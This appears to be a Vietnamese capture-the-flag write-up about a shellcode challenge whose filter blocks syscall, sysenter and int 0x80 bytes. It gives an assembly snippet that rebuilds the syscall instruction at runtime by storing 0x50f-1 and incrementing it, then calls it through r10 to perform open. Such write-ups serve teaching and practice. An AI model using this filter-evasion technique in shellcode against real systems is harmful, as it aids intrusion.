# Phân tích code 

<img width="954" height="522" alt="image" src="https://github.com/user-attachments/assets/e83a9614-4452-4407-adef-bbb354c1700b" />

### Lỗ hổng
Chương trình cho phép chúng ta nhập shellcode và thực thi ở cuối chương trình. Tuy nhiên, shellcode đã nhập trước khi thực thi sẽ được kiểm duyệt để kiểm tra xem có 2 BYTES nào bằng các giá trị `0x50F` `0x340F` `0x80CD`.

<img width="660" height="220" alt="image" src="https://github.com/user-attachments/assets/c621a938-5553-4d89-ac46-cb7586402e86" />

Các BYTES trên tương ứng với syscall và các biến thể của nó.

### Mitigation
<img width="817" height="333" alt="image" src="https://github.com/user-attachments/assets/5223086f-ac0b-484c-bd23-5802f1d00cb2" />

Vì không có khả năng leak địa chỉ nên không thể khai thác theo các kĩ thuật khác ngoài ret2shellcode.

Trước tiên cần tìm giải pháp để bypass kiểm duyệt củ chương trình. Ý tưởng ở đây là đẩy 0x50f-1 vào một địa chỉ lưu trữ nào đó. Sau đó cộng lại 1 vào địa chỉ đó để khôi phục syscall. Cuối cùng gọi call vào địa chỉ chứa syscall.

VD: gọi open qua syscall đặt trong địa chỉ ở r10

    mov QWORD PTR [rsp-0x50], 0x50f-1  //đưa syscall fake vào
    inc BYTE PTR [rsp-0x50]            //khôi phục syscall
    lea r10, [rsp-0x50]                //lưu vào r10
    
    mov rax, 2
  	mov rdi, rsp
  	xor rsi, rsi
  	xor rdx, rdx
    mov WORD PTR [r10+2], 0xd5ff
  	call r10                            //gọi syscall qua call
